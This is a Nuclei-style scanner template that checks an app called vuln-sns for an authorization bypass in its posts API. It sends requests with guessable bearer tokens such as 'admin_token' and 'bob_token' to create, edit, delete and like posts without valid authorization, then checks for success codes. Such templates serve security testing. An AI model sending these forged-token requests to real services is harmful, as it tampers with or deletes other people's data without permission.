id: vuln-sns-posts-authorization-bypass

info:
  name: vuln-sns Posts Authorization Bypass
  author: devin
  severity: high
  description: Authorization bypass in posts endpoints through predictable token format and weak validation
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-285
  metadata:
    max-request: 5
  tags: authz,bypass,posts,vuln-sns

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/posts"
    
    headers:
      Content-Type: application/json
      Authorization: "Bearer admin_token"
    
    body: |
      {
        "content": "Unauthorized post creation test"
      }
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201
      
      - type: word
        words:
          - "content"
          - "id"
        condition: and
        part: body

  - method: PUT
    path:
      - "{{BaseURL}}/api/posts/1"
    
    headers:
      Content-Type: application/json
      Authorization: "Bearer bob_token"
    
    body: |
      {
        "content": "Unauthorized update by bob"
      }
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

  - method: DELETE
    path:
      - "{{BaseURL}}/api/posts/1"
    
    headers:
      Authorization: "Bearer charlie_token"
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

  - method: POST
    path:
      - "{{BaseURL}}/api/posts/1/like"
    
    headers:
      Authorization: "Bearer guest_token"
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

  - method: DELETE
    path:
      - "{{BaseURL}}/api/posts/1/like"
    
    headers:
      Authorization: "Bearer test_token"
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
